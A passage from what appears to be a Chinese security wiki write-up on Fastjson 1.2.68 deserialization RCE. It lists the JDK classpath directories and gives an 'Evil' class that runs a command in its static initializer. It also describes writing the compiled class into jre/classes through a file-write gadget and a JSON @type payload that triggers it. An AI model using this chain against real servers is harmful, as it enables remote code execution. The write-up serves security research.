<span class="token operator">/</span><span class="token class-name">Library</span><span class="token operator">/</span><span class="token class-name">Java</span><span class="token operator">/</span><span class="token class-name">JavaVirtualMachines</span><span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">8.0_241</span><span class="token punctuation">.</span>jdk<span class="token operator">/</span><span class="token class-name">Contents</span><span class="token operator">/</span><span class="token class-name">Home</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>rt<span class="token punctuation">.</span>jar
<span class="token operator">/</span><span class="token class-name">Library</span><span class="token operator">/</span><span class="token class-name">Java</span><span class="token operator">/</span><span class="token class-name">JavaVirtualMachines</span><span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">8.0_241</span><span class="token punctuation">.</span>jdk<span class="token operator">/</span><span class="token class-name">Contents</span><span class="token operator">/</span><span class="token class-name">Home</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>sunrsasign<span class="token punctuation">.</span>jar
<span class="token operator">/</span><span class="token class-name">Library</span><span class="token operator">/</span><span class="token class-name">Java</span><span class="token operator">/</span><span class="token class-name">JavaVirtualMachines</span><span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">8.0_241</span><span class="token punctuation">.</span>jdk<span class="token operator">/</span><span class="token class-name">Contents</span><span class="token operator">/</span><span class="token class-name">Home</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>jsse<span class="token punctuation">.</span>jar
<span class="token operator">/</span><span class="token class-name">Library</span><span class="token operator">/</span><span class="token class-name">Java</span><span class="token operator">/</span><span class="token class-name">JavaVirtualMachines</span><span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">8.0_241</span><span class="token punctuation">.</span>jdk<span class="token operator">/</span><span class="token class-name">Contents</span><span class="token operator">/</span><span class="token class-name">Home</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>jce<span class="token punctuation">.</span>jar
<span class="token operator">/</span><span class="token class-name">Library</span><span class="token operator">/</span><span class="token class-name">Java</span><span class="token operator">/</span><span class="token class-name">JavaVirtualMachines</span><span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">8.0_241</span><span class="token punctuation">.</span>jdk<span class="token operator">/</span><span class="token class-name">Contents</span><span class="token operator">/</span><span class="token class-name">Home</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>charsets<span class="token punctuation">.</span>jar
<span class="token operator">/</span><span class="token class-name">Library</span><span class="token operator">/</span><span class="token class-name">Java</span><span class="token operator">/</span><span class="token class-name">JavaVirtualMachines</span><span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">8.0_241</span><span class="token punctuation">.</span>jdk<span class="token operator">/</span><span class="token class-name">Contents</span><span class="token operator">/</span><span class="token class-name">Home</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>jfr<span class="token punctuation">.</span>jar
<span class="token operator">/</span><span class="token class-name">Library</span><span class="token operator">/</span><span class="token class-name">Java</span><span class="token operator">/</span><span class="token class-name">JavaVirtualMachines</span><span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">8.0_241</span><span class="token punctuation">.</span>jdk<span class="token operator">/</span><span class="token class-name">Contents</span><span class="token operator">/</span><span class="token class-name">Home</span><span class="token operator">/</span>jre<span class="token operator">/</span>classes
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>sun.boot.class.path 是一个配置变量，通过执行</p><p>​<code>System.getProperty(&quot;sun.boot.class.path&quot;)</code>​</p><p>可以获取到以上路径列表，该列表即为 Bootstrap ClassLoader 加载类时，文件的读取路径。</p><ul><li><strong>Ext ClassLoader(java.ext.dirs)</strong></li></ul><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token operator">/</span><span class="token class-name">Library</span><span class="token operator">/</span><span class="token class-name">Java</span><span class="token operator">/</span><span class="token class-name">JavaVirtualMachines</span><span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">8.0_241</span><span class="token punctuation">.</span>jdk<span class="token operator">/</span><span class="token class-name">Contents</span><span class="token operator">/</span><span class="token class-name">Home</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>ext<span class="token operator">/</span>sunec<span class="token punctuation">.</span>jar
<span class="token operator">/</span><span class="token class-name">Library</span><span class="token operator">/</span><span class="token class-name">Java</span><span class="token operator">/</span><span class="token class-name">JavaVirtualMachines</span><span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">8.0_241</span><span class="token punctuation">.</span>jdk<span class="token operator">/</span><span class="token class-name">Contents</span><span class="token operator">/</span><span class="token class-name">Home</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>ext<span class="token operator">/</span>nashorn<span class="token punctuation">.</span>jar
<span class="token operator">/</span><span class="token class-name">Library</span><span class="token operator">/</span><span class="token class-name">Java</span><span class="token operator">/</span><span class="token class-name">JavaVirtualMachines</span><span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">8.0_241</span><span class="token punctuation">.</span>jdk<span class="token operator">/</span><span class="token class-name">Contents</span><span class="token operator">/</span><span class="token class-name">Home</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>ext<span class="token operator">/</span>cldrdata<span class="token punctuation">.</span>jar
<span class="token operator">/</span><span class="token class-name">Library</span><span class="token operator">/</span><span class="token class-name">Java</span><span class="token operator">/</span><span class="token class-name">JavaVirtualMachines</span><span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">8.0_241</span><span class="token punctuation">.</span>jdk<span class="token operator">/</span><span class="token class-name">Contents</span><span class="token operator">/</span><span class="token class-name">Home</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>ext<span class="token operator">/</span>jfxrt<span class="token punctuation">.</span>jar
<span class="token operator">/</span><span class="token class-name">Library</span><span class="token operator">/</span><span class="token class-name">Java</span><span class="token operator">/</span><span class="token class-name">JavaVirtualMachines</span><span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">8.0_241</span><span class="token punctuation">.</span>jdk<span class="token operator">/</span><span class="token class-name">Contents</span><span class="token operator">/</span><span class="token class-name">Home</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>ext<span class="token operator">/</span>dnsns<span class="token punctuation">.</span>jar
<span class="token operator">/</span><span class="token class-name">Library</span><span class="token operator">/</span><span class="token class-name">Java</span><span class="token operator">/</span><span class="token class-name">JavaVirtualMachines</span><span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">8.0_241</span><span class="token punctuation">.</span>jdk<span class="token operator">/</span><span class="token class-name">Contents</span><span class="token operator">/</span><span class="token class-name">Home</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>ext<span class="token operator">/</span>localedata<span class="token punctuation">.</span>jar
<span class="token operator">/</span><span class="token class-name">Library</span><span class="token operator">/</span><span class="token class-name">Java</span><span class="token operator">/</span><span class="token class-name">JavaVirtualMachines</span><span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">8.0_241</span><span class="token punctuation">.</span>jdk<span class="token operator">/</span><span class="token class-name">Contents</span><span class="token operator">/</span><span class="token class-name">Home</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>ext<span class="token operator">/</span>sunjce_provider<span class="token punctuation">.</span>jar
<span class="token operator">/</span><span class="token class-name">Library</span><span class="token operator">/</span><span class="token class-name">Java</span><span class="token operator">/</span><span class="token class-name">JavaVirtualMachines</span><span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">8.0_241</span><span class="token punctuation">.</span>jdk<span class="token operator">/</span><span class="token class-name">Contents</span><span class="token operator">/</span><span class="token class-name">Home</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>ext<span class="token operator">/</span>sunpkcs11<span class="token punctuation">.</span>jar
<span class="token operator">/</span><span class="token class-name">Library</span><span class="token operator">/</span><span class="token class-name">Java</span><span class="token operator">/</span><span class="token class-name">JavaVirtualMachines</span><span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">8.0_241</span><span class="token punctuation">.</span>jdk<span class="token operator">/</span><span class="token class-name">Contents</span><span class="token operator">/</span><span class="token class-name">Home</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>ext<span class="token operator">/</span>jaccess<span class="token punctuation">.</span>jar
<span class="token operator">/</span><span class="token class-name">Library</span><span class="token operator">/</span><span class="token class-name">Java</span><span class="token operator">/</span><span class="token class-name">JavaVirtualMachines</span><span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">8.0_241</span><span class="token punctuation">.</span>jdk<span class="token operator">/</span><span class="token class-name">Contents</span><span class="token operator">/</span><span class="token class-name">Home</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>ext<span class="token operator">/</span>zipfs<span class="token punctuation">.</span>jar
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>【linux openjdk8】</strong></p><ul><li><strong>Bootstrap ClassLoader(sun.boot.class.path)</strong></li></ul><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token operator">/</span>opt<span class="token operator">/</span>java<span class="token operator">/</span>openjdk<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>resources<span class="token punctuation">.</span>jar
<span class="token operator">/</span>opt<span class="token operator">/</span>java<span class="token operator">/</span>openjdk<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>rt<span class="token punctuation">.</span>jar
<span class="token operator">/</span>opt<span class="token operator">/</span>java<span class="token operator">/</span>openjdk<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>sunrsasign<span class="token punctuation">.</span>jar
<span class="token operator">/</span>opt<span class="token operator">/</span>java<span class="token operator">/</span>openjdk<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>jsse<span class="token punctuation">.</span>jar
<span class="token operator">/</span>opt<span class="token operator">/</span>java<span class="token operator">/</span>openjdk<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>jce<span class="token punctuation">.</span>jar
<span class="token operator">/</span>opt<span class="token operator">/</span>java<span class="token operator">/</span>openjdk<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>charsets<span class="token punctuation">.</span>jar
<span class="token operator">/</span>opt<span class="token operator">/</span>java<span class="token operator">/</span>openjdk<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>jfr<span class="token punctuation">.</span>jar
<span class="token operator">/</span>opt<span class="token operator">/</span>java<span class="token operator">/</span>openjdk<span class="token operator">/</span>jre<span class="token operator">/</span>classes
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul><li><strong>Ext ClassLoader(java.ext.dirs)</strong></li></ul><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token operator">/</span>opt<span class="token operator">/</span>java<span class="token operator">/</span>openjdk<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>ext
<span class="token operator">/</span>usr<span class="token operator">/</span>java<span class="token operator">/</span>packages<span class="token operator">/</span>lib<span class="token operator">/</span>ext
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>【聚焦于】</strong></p><p>​<code>/xxxx/jre/classes</code>​ <strong><mark>加载目录</mark></strong>。</p><h3 id="实践" tabindex="-1"><a class="header-anchor" href="#实践"><span>实践</span></a></h3><p>环境搭建，同上述的 fatjar 环境。</p><p><strong>【编写 Evil 类】</strong></p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span>

<span class="token doc-comment comment">/**
 * <span class="token keyword">@author</span> threedr3am
 */</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Evil</span> <span class="token keyword">implements</span> <span class="token class-name">AutoCloseable</span> <span class="token punctuation">{</span>

    <span class="token keyword">static</span> <span class="token punctuation">{</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token comment">// Runtime.getRuntime().exec(&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;);</span>
            <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">&quot;calc&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>

    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>【<strong>编译】</strong></p><p>​<code>javac .\Evil.java</code>​</p><p>【<strong>写入】</strong></p><p>利用写文件的 gadget 将生成的 <code>.class</code>​ 文件写入到 <code>jre/classes</code>​ 目录下。（<strong><mark>classes 目录不存在就创建一个，由于类加载机制的路径，请务必写对目录名。并在该目录下写入恶意 .class 字节码文件</mark></strong>）</p><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240429135115-rjkqxsh.92707f76.png" alt="image" loading="lazy">​</p><p><strong>同样也是只能加载触发一次。</strong></p><div class="language-json line-numbers-mode" data-ext="json" data-title="json"><pre class="language-json"><code><span class="token punctuation">{</span>
    <span class="token property">&quot;x&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        <span class="token property">&quot;@type&quot;</span><span class="token operator">:</span> <span class="token string">&quot;java.lang.AutoCloseable&quot;</span><span class="token punctuation">,</span>
        <span class="token property">&quot;@type&quot;</span><span class="token operator">:</span> <span class="token string">&quot;Evil&quot;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240429135227-l4utba2.087d59b2.png" alt="image" loading="lazy">​</p><p>【<strong>相对于 charsets.jar 文件，具有两个优点】</strong></p><ol><li>上传的文件更小</li><li>不需要知道目标 jdk 版本（直接编译一个低版本的恶意 class），不会对业务正常运行带来隐患</li><li>也不需要确认懒加载的 jar 包，<mark>但是有一个问题目标也可能不存在 classes 目录，这样目录不存在也会导致写入失败</mark></li></ol><h3 id="总结" tabindex="-1"><a class="header-anchor" href="#总结"><span>总结</span></a></h3><p>其实 Fastjson 触发加载初始化 class 的方法可能还有很多，这里重点想要表达的是，<strong><mark>可以通过上传恶意 class 到 jre/classes 目录，实现更优的“从文件上传到 Fastjson RCE”。</mark></strong> 可惜的是，jdk11 中 ClassLoader 已经被大幅改动了，就连最新版本的 Fastjson 都默认开启 safe mode 了。</p><h2 id="前人栽树" tabindex="-1"><a class="header-anchor" href="#前人栽树"><span>前人栽树</span></a></h2><ul><li><a href="https://y4er.com/posts/fastjson-bypass-autotype-1268/" target="_blank" rel="noopener noreferrer">fastjson 1.2.68 bypass autotype - Y4er 的博客<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></li><li><a href="https://github.com/Y4er/fastjson-bypass-autotype-1.2.68" target="_blank" rel="noopener noreferrer">Y4er/fastjson-bypass-autotype-1.2.68<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></li><li><a href="https://www.cnblogs.com/tr1ple/p/13489260.html#DTApDDSF" target="_blank" rel="noopener noreferrer">Fastjson1.2.68 绕 Autotype 的一点总结 - tr1ple - 博客园 (cnblogs.com)<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></li><li><a href="https://javasec.org/java-vuls/FastJson.html#8-fastjson-1268" target="_blank" rel="noopener noreferrer">Fastjson 反序列化漏洞 · 攻击 Java Web 应用-[Java Web 安全] (javasec.org)<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></li><li><a href="https://rmb122.com/2020/06/12/fastjson-1-2-68-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-gadgets-%E6%8C%96%E6%8E%98%E7%AC%94%E8%AE%B0/" target="_blank" rel="noopener noreferrer">fastjson 1.2.68 反序列化漏洞 gadgets 挖掘笔记 - rmb122<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a>​<a href="https://rmb122.com/2020/06/12/fastjson-1-2-68-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-gadgets-%E6%8C%96%E6%8E%98%E7%AC%94%E8%AE%B0/" target="_blank" rel="noopener noreferrer">&#39;s notebook<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></li><li><a href="https://blog.csdn.net/mole_exp/article/details/122315526" target="_blank" rel="noopener noreferrer">Fastjson 反序列化高危漏洞系列-part2：1.2.68 反序列化漏洞及利用链分析 (上)-CSDN 博客<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></li><li><a href="https://mp.weixin.qq.com/s/EXnXCy5NoGIgpFjRGfL3wQ" target="_blank" rel="noopener noreferrer">fastjson 1.2.68 最新版本有限制 autotype bypass (qq.com)<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></li><li><a href="https://zonghaishang.github.io/categories/Fastjson%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90/" target="_blank" rel="noopener noreferrer">诣极的博客 (zonghaishang.github.io) -- Fastjson 源码解析<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a> -- 感觉还想挖掘的话必读</li><li><a href="https://github.com/threedr3am/learnjavabug/commit/ea61297cf7b2125ecae0064d2b8061a9e32db1e6" target="_blank" rel="noopener noreferrer">feat:fastjson 一种利用 $ref 几乎任意 getter 触发的方法 · threedr3am/learnjavabug@ea61297 (github.com)<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></li><li><a href="https://mp.weixin.qq.com/s/SOKLC_No0hV9RhAavF2hcw" target="_blank" rel="noopener noreferrer">【两万字原创长文】完全零基础入门 Fastjson 系列漏洞（基础篇） (qq.com)<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></li><li><a href="https://mp.weixin.qq.com/s?__biz=MzI3MzUwMTQwNg==&amp;mid=2247485312&amp;idx=1&amp;sn=22dddceccf679f34705d987181a328db&amp;scene=21&amp;token=1393640502&amp;lang=zh_CN" target="_blank" rel="noopener noreferrer">fastjson v1.2.68 RCE 利用链复现 (qq.com)<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></li></ul></div><!--[--><!----><!--]--><footer class="vp-page-meta"><div class="vp-meta-item edit-link"><a href="https://github.com/zha0cai/edit/main/src/codereview/【JavaSec】漏洞分析/fastjson 反序列化 (Ⅳ).md" rel="noopener noreferrer" target="_blank" aria-label="在 GitHub 上编辑此页" class="nav-link vp-meta-label"><!--[--><svg xmlns="http://www.w3.org/2000/svg" class="icon edit-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="edit icon"><path d="M430.818 653.65a60.46 60.46 0 0 1-50.96-93.281l71.69-114.012 7.773-10.365L816.038 80.138A60.46 60.46 0 0 1 859.225 62a60.46 60.46 0 0 1 43.186 18.138l43.186 43.186a60.46 60.46 0 0 1 0 86.373L588.879 565.55l-8.637 8.637-117.466 68.234a60.46 60.46 0 0 1-31.958 11.229z"></path><path d="M728.802 962H252.891A190.883 190.883 0 0 1 62.008 771.98V296.934a190.883 190.883 0 0 1 190.883-192.61h267.754a60.46 60.46 0 0 1 0 120.92H252.891a69.962 69.962 0 0 0-69.098 69.099V771.98a69.962 69.962 0 0 0 69.098 69.098h475.911A69.962 69.962 0 0 0 797.9 771.98V503.363a60.46 60.46 0 1 1 120.922 0V771.98A190.883 190.883 0 0 1 728.802 962z"></path></svg><!--]-->在 GitHub 上编辑此页<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span><!----></a></div><div class="vp-meta-item git-info"><div class="update-time"><span class="vp-meta-label">上次编辑于: </span><!----></div><div class="contributors"><span class="vp-meta-label">贡献者: </span><!--[--><!--[--><span class="vp-meta-info" title="email: 111300972+zha0cai@users.noreply.github.com">zha0cai</span><!--]--><!--]--></div></div></footer><!----><div id="vp-comment" class="giscus-wrapper input-top" style="display:block;"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" preserveAspectRatio="xMidYMid" viewBox="0 0 100 100"><circle cx="28" cy="75" r="11" fill="currentColor"><animate attributeName="fill-opacity" begin="0s" dur="1s" keyTimes="0;0.2;1" repeatCount="indefinite" values="0;1;1"></animate></circle><path fill="none" stroke="#88baf0" stroke-width="10" d="M28 47a28 28 0 